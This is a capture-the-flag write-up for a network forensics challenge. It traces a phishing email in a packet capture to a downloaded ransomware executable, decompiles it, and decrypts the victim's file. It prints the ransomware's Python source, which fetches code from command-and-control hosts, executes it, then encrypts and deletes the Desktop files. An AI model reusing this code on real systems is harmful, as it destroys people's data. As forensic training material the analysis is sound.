# Find The Key

## Description

{% code overflow="wrap" %}
```
While investigationg the Rift, Defender received a weird order from Headquarters.
The order was to, with the PCAP file of a ransomware incident, analyse what happened.
'Headquarter was never into tasks like this, but an order's an order...'

Here's the order:
[Staff A, who works at a security company, executed an update file received through the company's internal email and became infected with ransomware.
Analyse the attached PCAP file, decrypt the encrypted files, and submit the FLAG.
Received from Headqu__ters]

1 = The attackers email address
2 = The value inside the decrypted files

Flag format : CDDC2026{1_2}
```
{% endcode %}

Category: Network (100pts)

## Walkthrough

We're provided with a zip file containing two files, a network capture file and a binary file. The file extension of the binary file is unknown, likely a custom file extension for an application.

<figure><img src="../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

If we try to print the contents of Key.hwj, all we get is some garbage binary data

<figure><img src="../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

We can move on to the network capture, and start investigating the traffic that was captured.

<figure><img src="../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

If we filter for HTTP requests, we see a couple of requests to what appears to be a web mail service. The user (192.168.50.100) then downloads some content from a server (15.230.15.3). We can follow this data stream and see what the user was doing. If we navigate to TCP stream 52, we can see the contents of the email that the user is reading.

<figure><img src="../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

The target URL of the install hyperlink immediately catches my attention. The address matches what we saw earlier, when the user (presumably "victim" now) clicked on the link to download the security software. We can filter by traffic going to/coming from 15.230.15.3, and check out what we're working with.

<figure><img src="../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (403).png" alt=""><figcaption></figcaption></figure>

The inline JavaScript code looks pretty suspicious, maybe we can try to run the code ourselves to see what it does.

<figure><img src="../../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

The code forms a new URL from a string of characters, then makes the browser redirect to it. We can jump ahead to where the victim navigates to the new URL, and see what is downloaded.

<figure><img src="../../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

Looks like the user downloaded a Windows executable, as indicated by the Content-Type and the first two bytes of the payload being "MZ". We can save this binary to our local system, and do more forensics on it.

<figure><img src="../../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>

Based on the output of the strings command, we can see some strings that indicate that the executable is a Python executable. We can disassemble the executable using [Pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor), which will generate compiled Python (.pyc) files for further analysis.

<figure><img src="../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

The file that we're interested in is app.pyc, which is the name of the original Python script that was compiled. We can use an online tool called Pylingual to analyze the file and return the reconstructed Python code.

<figure><img src="../../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

Copy the script out to your host machine, and open it in your text editor of choice. Immediately we see some dummy functions being defined and called, likely to obfuscate the script's actual purpose. After cleaning up the code and removing the redundant functions, we're left with the following script

<details>

<summary>Cleaned-up <em>app.py</em></summary>

{% code overflow="wrap" %}
```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'app.py'
# Bytecode version: 3.10.b1 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import time
import ctypes
import requests
import json
import execjs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from PIL import Image
C2_BASE = 'http://15.230.15.3:8080'
C2_BASE2 = 'http://120.1.38.33:8080'
WALLPAPER_LOCAL = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'ransome.png')
SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 1
SPIF_SENDCHANGE = 2
def set_wallpaper_windows(image_path: str) -> bool:
    try:
        result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        return bool(result)
    except Exception as e:
        print(f'[!] Wallpaper change failed: {e}')
        return False
time.sleep(1)
def extract_lsb(png_path: str, length: int) -> bytes:
    img = Image.open(png_path).convert('RGB')
    pixels = list(img.get_flattened_data())
    bits = [pixels[i][0] & 1 for i in range(length * 8)]
    result = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for bit in bits[i:i + 8]:
            byte = byte << 1 | bit
        result.append(byte)
    return bytes(result)
def main():
    try:
        r = requests.get(f'{C2_BASE}/assets/wallpaper', timeout=10)
        r.raise_for_status()
        with open(WALLPAPER_LOCAL, 'wb') as f:
            f.write(r.content)
    except Exception as e:
        print(f'[!] wallpaper download failed: {e}')
        return None
    time.sleep(1)
    def download():
        # irreducible cflow, using cdg fallback
        # ***<module>.main.download: Failure: Compilation Error
        try:
            pass
        finally:
            r = requests.get(f'{C2_BASE}/', timeout=5)
            r.raise_for_status()
            return
        try:
            r.close
        except:
            return True
        except Exception as e:
            pass
        print(f'[!] download failed: {e}')
        return False
        try:
            pass
        except:
            pass
    
    def crypto():
        xor_key = extract_lsb(WALLPAPER_LOCAL, length=1)[0]
        r = requests.get(f'{C2_BASE2}/s', timeout=5)
        raw_data = r.content
        xor_result = bytes([b ^ xor_key for b in raw_data]).decode('utf-8')
        ctx = execjs.compile(xor_result)
        config = ctx.call('_0x2f91')
        aes_key = config['key'].encode()
        aes_iv = config['iv'].encode()
        padding_code = config['padding'].encode()
        print(aes_iv)
        print(aes_key)
        print(padding_code)
        target_dir = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')
        def secure_encrypt_file(filepath, key, iv, p_code):
            if p_code!= b'987':
                raise ValueError(f'Unknown padding code: {p_code}')
            else:
                base, _ = os.path.splitext(filepath)
                new_filepath = base + '.hwj'
                chunk_size = 65536
            try:
                cipher = AES.new(key, AES.MODE_CBC, iv)
                with open(filepath, 'rb') as f_in, open(new_filepath, 'wb') as f_out:
                        while True:
                            data = f_in.read(chunk_size)
                            if not data:
                                break
                            else:
                                if len(data) < chunk_size:
                                    data = pad(data, AES.block_size)
                                    f_out.write(cipher.encrypt(data))
                                    break
                                f_out.write(cipher.encrypt(data))
                os.remove(filepath)
                print(f'[+] Encrypted: {filepath}')
            except Exception as e:
                print(f'[-] Error processing {filepath}: {e}')
                if os.path.exists(new_filepath):
                    os.remove(new_filepath)
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                if file.endswith('.hwj'):
                    continue
                else:
                    filepath = os.path.join(root, file)
                    if not os.path.isfile(filepath):
                        continue
                    else:
                        secure_encrypt_file(filepath, aes_key, aes_iv, padding_code)
    set_wallpaper_windows(WALLPAPER_LOCAL)
if __name__ == '__main__':
    main()

```
{% endcode %}

</details>

The script does a couple of things, in the following order:

* Attempt to connect to the following URL "http\[:]//15.230.15.3:8080/assets/wallpaper" and write the response body to the local filesystem
* Perform LSB (least-significant bit) extraction from the wallpaper image
* Attempt to connect to the following URL "http\[:]//120.1.38.33:8080/s" and save the response body to a variable
* XOR the contents of the previously-defined variable with the LSB data obtained from the wallpaper
* Execute the xor'd data as JavaScript, and call a function to retrieve an IV, key and padding
* Iterate recursively through the current user's Desktop folder
  * If the current file is a directory, skip it
  * Otherwise, encrypt the file using AES-CBC, with the encryption variables retrieved earlier
  * After encrypting the file, write it back to a new file with the .hwj extension

We can go back to the network capture and retrieve the new files that we need to decrypt the key file.

<figure><img src="../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

Since AES-CBC is a symmetric cipher, we can reverse the encryption with the information we have. We can use this script to automate the key extraction and the decryption process.

<details>

<summary><em>decrypt.py</em></summary>

{% code overflow="wrap" %}
```python
import os
import time
import ctypes
import requests
import json
import execjs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import Image


def extract_lsb(png_path: str, length: int) -> bytes:
    img = Image.open(png_path).convert('RGB')
    pixels = list(img.get_flattened_data())
    bits = [pixels[i][0] & 1 for i in range(length * 8)]
    result = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for bit in bits[i:i + 8]:
            byte = byte << 1 | bit
        result.append(byte)
    return bytes(result)

def main():
    xor_key = extract_lsb("wallpaper.png", length=1)[0]
    with open("s", "rb") as f:
        raw_data = f.read()
    xor_result = bytes([b ^ xor_key for b in raw_data]).decode('utf-8')
    ctx = execjs.compile(xor_result)
    config = ctx.call('_0x2f91')
    aes_key = config['key'].encode()
    aes_iv = config['iv'].encode()
    padding_code = config['padding'].encode()
    print(aes_iv)
    print(aes_key)
    print(padding_code)

    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    i = 0
    with open("Key.hwj", "rb") as f_in, open("Key.decrypt", "wb") as f_out:
        while True:
            i += 1
            data = f_in.read(65536)
            if not data:
                break
            else:
                if len(data) < 65536:
                    f_out.write(unpad(cipher.decrypt(data), AES.block_size))
                    break
                f_out.write(cipher.decrypt(data))

            print(f"Decrypted block {i}")
    print("Done")

if __name__ == "__main__":
    main()

```
{% endcode %}

</details>

<figure><img src="../../.gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

